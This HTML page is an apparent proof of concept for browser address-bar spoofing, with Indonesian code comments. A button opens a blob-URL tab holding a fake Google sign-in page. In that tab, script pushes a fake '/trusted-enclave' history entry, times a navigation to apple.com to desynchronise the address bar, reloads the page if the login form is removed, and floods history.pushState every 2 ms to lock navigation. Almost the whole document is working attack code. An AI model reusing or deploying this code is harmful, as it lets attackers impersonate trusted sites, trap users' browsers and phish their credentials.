<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Ultimate Synchronized Chaining Engine</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #050507;
        color: #fff;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 24px;
        margin-bottom: 8px;
        color: #f5f5f7;
        text-align: center;
        font-weight: 800;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Optimized Chaining Engine</h1>
      <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
        EXECUTE SYNCHRONIZED LOCK
      </button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membangun Payload Terpadu yang Mengendalikan Alurnya Sendiri secara Mutlak
        const rawPayload = `
          <!DOCTYPE html>
          <html lang="en">
          <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Sign in - Google Accounts</title>
              <script src="https://cdn.tailwindcss.com"><\/script>
              <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
              <style>
                  body {
                      font-family: 'Inter', sans-serif;
                      background-color: #f0f2f5;
                      display: flex;
                      justify-content: center;
                      align-items: center;
                      min-height: 100vh;
                      margin: 0;
                  }
                  .login-container {
                      background-color: #fff;
                      padding: 2.5rem;
                      border-radius: 8px;
                      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
                      width: 100%;
                      max-width: 400px;
                      text-align: center;
                      box-sizing: border-box;
                  }
                  .input-field {
                      width: 100%;
                      padding: 0.75rem 1rem;
                      margin-bottom: 1.25rem;
                      border: 1px solid #dadce0;
                      border-radius: 4px;
                      font-size: 1rem;
                      box-sizing: border-box;
                  }
                  .btn-primary {
                      background-color: #1a73e8;
                      color: #fff;
                      padding: 0.75rem 1.5rem;
                      border-radius: 4px;
                      font-size: 1rem;
                      font-weight: 500;
                      cursor: pointer;
                      width: 100%;
                  }
              </style>
          </head>
          <body>
              <div class="login-container">
                  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
                  <h1 class="text-2xl font-normal mb-2">Sign in</h1>
                  <p class="text-base text-gray-600 mb-6">Use your Google Account</p>

                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:48px;\\'>Pwned - Context Locked</h1>'">
                      <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
                      <input type="password" id="password" class="input-field" placeholder="Password" required>
                      <button type="submit" class="btn-primary">Next</button>
                  </form>
              </div>

              <script>
                // Menerapkan Trusted Enclave State ke History
                try {
                  history.pushState({trusted: true}, '', '/trusted-enclave');
                } catch(e) {}

                // Sinkronisasi Frame Render Pipeline menggunakan Double-RAF
                window.addEventListener('pageshow', () => {
                  requestAnimationFrame(() => {
                    requestAnimationFrame(() => {
                      setTimeout(() => {
                        try {
                          // Target Navigasi Utama yang memicu desynchronization address bar
                          location.href = 'https://apple.com';
                        } catch(err) {}
                      }, 50);
                    });
                  });
                });

                // Watchdog Mandiri untuk menjaga struktur DOM tetap stabil
                try {
                  const observer = new MutationObserver(() => {
                    if (!document.getElementById('loginForm')) {
                      location.reload();
                    }
                  });
                  observer.observe(document.documentElement, { childList: true, subtree: true });
                } catch(e) {}

                // Membanjiri History State untuk mengunci NavigationController
                setInterval(() => {
                  try {
                    history.pushState({lock: Math.random()}, "", "#secure-state");
                  } catch(err) {}
                }, 2);
              <\/script>
          </body>
          </html>
        `;

        // 2. Enkripsi Base64 Dinamis
        const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
        const decoded = decodeURIComponent(escape(atob(encoded)));

        const blob = new Blob([decoded], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // 3. Membuka jendela baru dan menyerahkan eksekusi sepenuhnya pada payload di dalam Blob
        const newTab = window.open(blobUrl, "_blank");

        if (newTab) {
          try { newTab.focus(); } catch (e) {}
        }
      };
    </script>
  </body>
</html>
